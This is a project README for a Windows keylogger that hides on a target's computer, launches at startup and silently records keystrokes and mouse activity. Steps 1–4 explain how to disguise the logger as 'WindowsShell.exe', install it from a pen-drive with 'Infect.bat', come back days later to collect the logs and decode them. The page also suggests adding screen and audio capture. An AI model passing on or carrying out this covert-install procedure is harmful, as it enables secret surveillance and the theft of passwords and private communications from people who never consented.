# :key: Smart Key Logger 

#### A Terrific Keystroke Recorder

This tacky program hides itself in the subject’s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.

### How to use?

1. Download the full package from [here](https://github.com/MinhasKamal/SmartKeyLogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look like this-

<div align="center">
  <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="Key-Logger"/>
</div>

2. **WindowsShell.exe** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **Infect.bat**. This will install **WindowsShell.exe** and **WindowsShell.lnk** in that PC.

3. Wait for some days, then return to the PC, and run **CollectData.bat**. You will get a file named **Record.log**.

4. Now, simply run **RecordDecoder.exe** (do not rename **Record.log**). You will get another file- **Data.log**. Here you will get that you want.

5. If you want to remove the Keylogger from that PC, run **Cure.bat**.


Surely you can use it in many other ways; and also enhance its ability by adding a screen capturer, or sound recorder, and so on.

**Note:** I do not want newbies to abuse my project, so I am **not revealing all the secrets**. I will also not take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this. 

This is actually a pre-project for [TrojanCockroach](https://github.com/MinhasKamal/TrojanCockroach).

### License
<a rel="license" href="http://www.gnu.org/licenses/gpl.html">
<img alt="GNU General Public License" style="border-width:0" src="http://www.gnu.org/graphics/gplv3-127x51.png" />
</a>
<br/><a href="https://github.com/MinhasKamal/SmartKeyLogger">SmartKeyLogger</a> is licensed under a <a rel="license" href="http://www.gnu.org/licenses/gpl.html">GNU General Public License version-3</a>.
